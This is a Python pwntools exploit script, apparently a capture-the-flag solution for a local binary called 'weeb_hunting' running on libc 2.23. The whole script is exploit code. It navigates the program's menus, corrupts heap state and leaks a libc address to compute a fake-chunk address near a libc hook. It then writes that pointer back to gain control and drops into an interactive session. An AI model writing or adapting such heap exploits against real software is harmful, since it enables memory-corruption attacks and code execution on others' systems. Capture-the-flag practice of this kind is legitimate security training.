from pwn import *

p = process("./weeb_hunting")

elf = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

pwnlib.gdb.attach(p)

r = p.recv()
while "You found a" not in r:
	r = p.recvuntil(">")
	p.send("AAAA\n")
p.send("AAAA\n")
r = p.recv()
while "You found a" not in r:
	r = p.recvuntil(">")
	p.send("AAAA\n")
p.send("AAAA\n")
r = p.recv()
while "You found a" not in r:
	r = p.recvuntil(">")
	p.send("AAAA\n")
p.send("\n")
r = p.recv()
while "You found a" not in r:
	r = p.recvuntil(">")
	p.send("\n")
p.send("\n")
r = p.recv()

while "10. empty" not in r:
	p.send("\n")
	r = p.recv()

p.sendline("1")

r = p.recv()
while "10. empty" not in r:
	p.send("\n")
	r = p.recv()

p.sendline("4")

r = p.recv()
while "You found a" not in r:
	p.send("\n")
	r = p.recv()

p.sendline('\x41\x22\x60')

r = p.recv()
while "You found a" not in r:
	p.send("\n")
	r = p.recv()

p.sendline('AAAA')
r = p.recv()
while "You found a" not in r:
	p.send("\n")
	r = p.recv()

p.sendline('AAAA')

r = p.recv()
while "You found a sword" not in r:
	p.send("\n")
	r = p.recv()

p.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` `")

r = p.recv()
while "10. empty" not in r:
	p.send("\n")
	r = p.recv()

__srandom = u64((r.split("1. ")[1].split("\n")[0] + "\x00"*8)[:8])
log.info(hex(__srandom))

hook = __srandom + 0x38A21D

log.info("Fake chunk: " + hex(hook))

p.sendline("2")
r = p.recv()

while "10. empty" not in r:
	p.send("\n")
	r = p.recv()

p.sendline("3")
r = p.recv()

while "10. empty" not in r:
	p.send("\n")
	r = p.recv()

p.sendline("4")
r = p.recv()

while "10. empty" not in r:
	p.send("\n")
	r = p.recv()

p.sendline("3")
r = p.recv()
while "You found a" not in r:
	p.send("\n")
	r = p.recv()

p.sendline(p64(hook)[:6])

p.interactive()
